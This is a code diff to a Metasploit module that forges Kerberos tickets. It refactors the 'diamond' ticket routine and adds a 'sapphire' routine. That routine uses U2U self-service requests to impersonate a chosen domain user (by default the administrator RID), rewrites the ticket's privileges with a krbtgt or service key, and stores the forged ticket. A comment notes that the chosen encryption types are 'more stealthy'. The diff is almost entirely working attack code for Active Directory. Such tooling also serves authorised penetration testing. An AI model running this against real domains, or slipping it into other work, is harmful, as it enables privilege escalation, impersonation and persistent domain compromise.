@@ -50,8 +50,8 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('USER', [ true, 'The Domain User' ]),
-        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier(RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID]),
+        OptString.new('USER', [ true, 'The Domain User to forge the ticket for' ]),
+        OptInt.new('USER_RID', [ true, "The Domain User's relative identifier (RID)", Rex::Proto::Kerberos::Pac::DEFAULT_ADMIN_RID], conditions: ['ACTION', 'in', %w[FORGE_SILVER FORGE_GOLDEN FORGE_DIAMOND]]),
         OptString.new('NTHASH', [ false, 'The krbtgt/service nthash' ]),
         OptString.new('AES_KEY', [ false, 'The krbtgt/service AES key' ]),
         OptString.new('DOMAIN', [ true, 'The Domain (upper case) Ex: DEMO.LOCAL' ]),
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('REQUEST_PASSWORD', [false, "The user's password, used to retrieve a base ticket"], conditions: based_on_real_ticket_condition),
         OptAddress.new('RHOSTS', [false, 'The address of the KDC' ], conditions: based_on_real_ticket_condition),
         OptInt.new('RPORT', [false, "The KDC server's port", 88 ], conditions: based_on_real_ticket_condition),
-        OptInt.new('Timeout', [false, 'The TCP timeout to establish Kerberos connection and read data', 10], conditions: based_on_real_ticket_condition)
+        OptInt.new('Timeout', [false, 'The TCP timeout to establish Kerberos connection and read data', 10], conditions: based_on_real_ticket_condition),
       ]
     )
 
@@ -144,26 +144,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def forge_diamond
     validate_key!
-    domain = datastore['DOMAIN'].upcase
-
-    enc_key, enc_type = get_enc_key_and_type
-    if enc_type == Rex::Proto::Kerberos::Crypto::Encryption::AES256
-      # This should be the server's preferred encryption type, so we can just
-      # send our default types, expecting that to be selected. More stealthy this way.
-      offered_etypes = Rex::Proto::Kerberos::Crypto::Encryption::DefaultOfferedEtypes
-    else
-      offered_etypes = [enc_type]
-    end
 
     begin
-      res = send_request_tgt(
-        server_name: "krbtgt/#{domain}",
-        client_name: datastore['REQUEST_USER'],
-        password: datastore['REQUEST_PASSWORD'],
-        realm: domain,
-        offered_etypes: offered_etypes,
+      options = {
         stop_if_preauth_not_required: false
-      )
+      }
+      include_crypto_params(options)
+
+      res = kerberos_authenticator.request_tgt_only(options)
     rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
       print_error("Requesting TGT failed: #{e.message}")
       return
@@ -174,11 +162,64 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    ticket = modify_ticket(res, datastore['USER'], datastore['USER_RID'], extra_sids, enc_type, enc_key)
+    ticket = modify_ticket(res.as_rep.ticket, res.decrypted_part, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, enc_key, enc_type, enc_key, false)
     ticket = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
 
     if datastore['VERBOSE']
       print_ccache_contents(ticket, key: enc_key)
+    end
+  end
+
+  def forge_sapphire
+    options = {
+      stop_if_preauth_not_required: false
+    }
+    include_crypto_params(options)
+
+    auth_context = kerberos_authenticator.authenticate_via_kdc(options)
+    credential = auth_context[:credential]
+
+    print_status("#{peer} - Using U2U to impersonate #{datastore['USER']}@#{datastore['DOMAIN']}")
+
+    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(
+      type: credential.keyblock.enctype.value,
+      value: credential.keyblock.data.value
+    )
+
+    enc_key, enc_type = get_enc_key_and_type
+    tgs_ticket, tgs_auth = kerberos_authenticator.u2uself(credential, impersonate: datastore['USER'])
+    ticket = modify_ticket(tgs_ticket, tgs_auth, datastore['USER'], datastore['USER_RID'], datastore['DOMAIN'], extra_sids, session_key.value, enc_type, enc_key, true)
+    ticket = Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ticket, framework_module: self, host: datastore['RHOST'])
+
+    if datastore['VERBOSE']
+      print_ccache_contents(ticket, key: enc_key)
+    end
+  end
+
+  def kerberos_authenticator
+    options = {
+      host: datastore['RHOST'],
+      realm: datastore['DOMAIN'],
+      timeout: datastore['TIMEOUT'],
+      username: datastore['REQUEST_USER'],
+      password: datastore['REQUEST_PASSWORD'],
+      framework: framework,
+      framework_module: self,
+      ticket_storage: Msf::Exploit::Remote::Kerberos::Ticket::Storage::None.new
+    }
+
+    Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)
+  end
+
+  def include_crypto_params(options)
+    key, enc_type = get_enc_key_and_type
+    options[:key] = key
+    if enc_type == Rex::Proto::Kerberos::Crypto::Encryption::AES256
+      # This should be the server's preferred encryption type, so we can just
+      # send our default types, expecting that to be selected. More stealthy this way.
+      options[:offered_etypes] = Rex::Proto::Kerberos::Crypto::Encryption::DefaultOfferedEtypes
+    else
+      options[:offered_etypes] = [enc_type]
     end
   end
 
